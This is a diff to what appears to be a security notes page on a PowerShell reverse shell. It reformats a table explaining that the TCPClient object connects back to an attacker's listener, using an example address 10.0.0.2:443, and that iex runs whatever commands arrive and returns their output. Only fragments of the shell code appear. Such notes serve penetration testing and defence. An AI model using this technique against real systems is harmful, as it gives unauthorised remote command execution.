@@ -36,10 +36,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 $client.Close();
 ```
 
-| Component | Description                                                                                                                                                                                                                                                                                                         |
-| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `$client` | <p>Variable (<code>System.Net.Sockets.TCPClient</code> class).<br><br>Declared with the <code>{IP}</code> and <code>{PORT}</code> of the listener substituted.<br><br>E.g. for a listener at <code>10.0.0.2:443</code> this object would be declared <code>System.Net.Sockets.TCPClient('10.0.0.2', 443)</code></p> |
-| `iex`     | Alias for the `Invoke-Expression` cmdlet that runs any string it receives as a command and the results of the command are then redirected and sent back via the data stream.                                                                                                                                        |
+<table><thead><tr><th width="249">Component</th><th>Description</th></tr></thead><tbody><tr><td><code>$client</code></td><td>Variable (<code>System.Net.Sockets.TCPClient</code> class).<br><br>Declared with the <code>{IP}</code> and <code>{PORT}</code> of the listener substituted.<br><br>E.g. for a listener at <code>10.0.0.2:443</code> this object would be declared <code>System.Net.Sockets.TCPClient('10.0.0.2', 443)</code></td></tr><tr><td><code>iex</code></td><td>Alias for the <code>Invoke-Expression</code> cmdlet that runs any string it receives as a command and the results of the command are then redirected and sent back via the data stream.</td></tr></tbody></table>
 
 
 
